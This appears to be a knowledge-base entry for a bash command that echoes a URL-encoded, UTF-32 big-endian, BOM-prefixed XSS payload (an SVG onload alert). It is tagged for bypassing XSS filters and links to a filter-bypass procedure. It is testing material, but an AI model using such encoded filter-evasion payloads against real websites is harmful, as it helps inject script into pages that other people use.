---
id: 6c3ddf1f-8d03-4b4e-8bf7-7f0e3916c97f
name: output-utf32-xss-payload
type: command
executor: bash
data: >-
  echo -n
  '%00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E'
output: >-
  %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
created_at: '2023-04-06T03:56:43.117736+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - macOS
tags:
  - xss
  - payload
  - bypass
verified: true
validated: true
---

# output-utf32-xss-payload

## Command

```bash
echo -n '%00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E'
```

## Description

Outputs URL-encoded UTF-32 Big Endian BOM-prepended XSS payload with SVG alert.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Static | Yes |

## Examples

### Basic Usage

```bash
echo -n '%00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E'
```

## Expected Output

%00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E

## Related

- [[procedures/Bypassing-XSS-Filters-Using-UTF-BOM-Character]]
- [[commands/output-utf32-big-endian-bom]]
